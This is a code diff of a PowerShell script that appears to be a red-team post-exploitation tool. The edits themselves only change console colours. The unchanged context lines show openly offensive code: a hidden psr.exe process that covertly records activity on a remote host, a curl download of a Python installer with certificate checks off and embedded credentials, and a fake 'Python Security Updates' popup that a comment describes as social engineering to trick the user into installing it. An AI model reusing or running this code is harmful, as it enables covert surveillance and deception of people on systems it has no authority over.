@@ -281,7 +281,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
    #>
 
    ## Make sure python (@webserver) process is running on remote system
-   write-host "`nKill @webserver python process(s) in $SKill seconds."
+   write-host "`nKill @webserver python process(s) in $SKill seconds."  -ForeGroundColor DarkGreen
    Start-Sleep -Seconds 1;Write-Host "`nId  Process  Version  Pid   StopTime"
    Write-Host "--  -------  -------  ---   --------" -ForeGroundColor DarkGreen
    $ProcessPythonRunning = Get-Process|Select-Object ProcessName|Select-String python
@@ -332,7 +332,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
    #>
 
    ## Create Data Table for Output
-   Write-Host "Active server sessions"
+   Write-Host "Active server sessions"  -ForeGroundColor DarkGreen
    Write-Host "`nId  Pid   StartTime  Bind          Port  Directory"
    Write-Host "--  ---   ---------  ----          ----  ---------" -ForeGroundColor DarkGreen
    If(Test-Path "$Env:TMP\sessions.log"){
@@ -484,7 +484,7 @@ If($SPsr -lt '8'){$SPsr = '10'} # Set the minimum capture time value
 
    ## Make sure psr.exe (LolBin) exists on remote host
    If(Test-Path "$Env:WINDIR\System32\psr.exe"){
-      write-host "Recording $Server_hostName activity for $SPsr seconds." -ForeGroundColor Green
+      write-host "Recording $Server_hostName activity for $SPsr seconds." -ForeGroundColor DarkGreen
       write-host "Capture: $CaptureFile" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
       ## Start psr.exe (-WindowStyle hidden) process detach (orphan) from parent process
       Start-Process -WindowStyle hidden powershell -ArgumentList "psr.exe", "/start", "/output $CaptureFile", "/sc 1", "/maxsc 100", "/gui 0;", "Start-Sleep -Seconds $SPsr;", "psr.exe /stop" -ErrorAction SilentlyContinue|Out-Null
@@ -620,7 +620,7 @@ If(-not($PythonVersion) -or $PythonVersion -ieq $null){
 
    If(cmd /c curl.exe --version){ # <-- Unnecessary step? curl its native (windows 10) rigth?
       ## Download python windows installer and use social engineering to trick user to install it
-      write-host "Downloading $BinName from python.org" -ForeGroundColor Yellow
+      write-host "Downloading $BinName from python.org" -ForeGroundColor DarkGreen
       cmd /c curl.exe -L -k -s https://www.python.org/ftp/python/3.9.0/$BinName -o %tmp%\$BinName -u SSARedTeam:s3cr3t
       Write-Host "Remote Spawning Social Engineering MsgBox."
       powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$BinName setup",4+48)|Out-Null
